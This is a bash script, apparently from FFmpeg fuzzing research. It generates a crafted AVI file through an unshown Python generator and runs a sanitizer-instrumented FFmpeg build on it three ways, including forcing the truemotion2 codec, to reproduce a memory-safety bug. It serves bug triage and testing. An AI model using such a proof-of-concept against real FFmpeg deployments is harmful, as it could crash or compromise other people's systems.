#!/bin/bash
set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "[*] Generating crafted AVI input..."
python3 vuln_001_gen.py

echo "[*] Running FFmpeg with ASAN+UBSAN (primary attempt: width=height=131072)..."
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:log_path=./ubsan.log" \
  "$BIN" -i vuln_001_input.avi -f null - > vuln_001_result.txt 2>&1 || true

# Collect any ASAN/UBSAN reports
cat asan.log.* >> vuln_001_result.txt 2>/dev/null || true
cat ubsan.log.* >> vuln_001_result.txt 2>/dev/null || true

echo "[*] Primary attempt output:"
cat vuln_001_result.txt

# Secondary attempt: try with explicit codec specification
echo ""
echo "[*] Secondary attempt: explicit codec + vframes 0..."
ASAN_OPTIONS="abort_on_error=0:log_path=./asan2.log" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:log_path=./ubsan2.log" \
  "$BIN" -vcodec truemotion2 -i vuln_001_input.avi -vframes 0 -f null - >> vuln_001_result.txt 2>&1 || true

cat asan2.log.* >> vuln_001_result.txt 2>/dev/null || true
cat ubsan2.log.* >> vuln_001_result.txt 2>/dev/null || true

# Tertiary attempt: probe only (no decoding)
echo ""
echo "[*] Tertiary attempt: stream info probe..."
ASAN_OPTIONS="abort_on_error=0:log_path=./asan3.log" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:log_path=./ubsan3.log" \
  "$BIN" -probesize 1000000 -analyzeduration 0 -i vuln_001_input.avi -f null - >> vuln_001_result.txt 2>&1 || true

cat asan3.log.* >> vuln_001_result.txt 2>/dev/null || true
cat ubsan3.log.* >> vuln_001_result.txt 2>/dev/null || true

echo ""
echo "[*] Done. Results in vuln_001_result.txt"
